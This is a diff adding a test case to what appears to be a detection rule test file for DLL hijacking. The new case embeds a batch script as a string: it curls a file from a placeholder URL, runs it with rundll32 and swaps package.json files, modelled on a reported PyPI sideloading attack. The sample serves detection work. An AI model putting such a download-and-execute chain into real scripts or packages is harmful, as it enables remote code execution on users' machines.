@@ -74,6 +74,11 @@ def f():
     x = "This is a string containing CreateRemoteThread"
 
 
+def f():
+    # ruleid: dll-hijacking
+    data = '@echo off\ncurl -o Temp.b -L "http://127.0.0.1/user/user.asp?id=237596" > nul 2>&1\nrename Temp.b package.db > nul 2>&1\nrundll32 package.db,GenerateKey 1234\ndel "package.db"\nif exist "pk.json" (\ndel "package.json" > nul 2>&1\nrename "pk.json" "package.json" > nul 2>&1\n)'
+
+
 """
 Phantom DLL case planting a DLL and executing a builtin binary
 ref: https://www.reversinglabs.com/blog/attackers-leverage-pypi-to-sideload-malicious-dlls
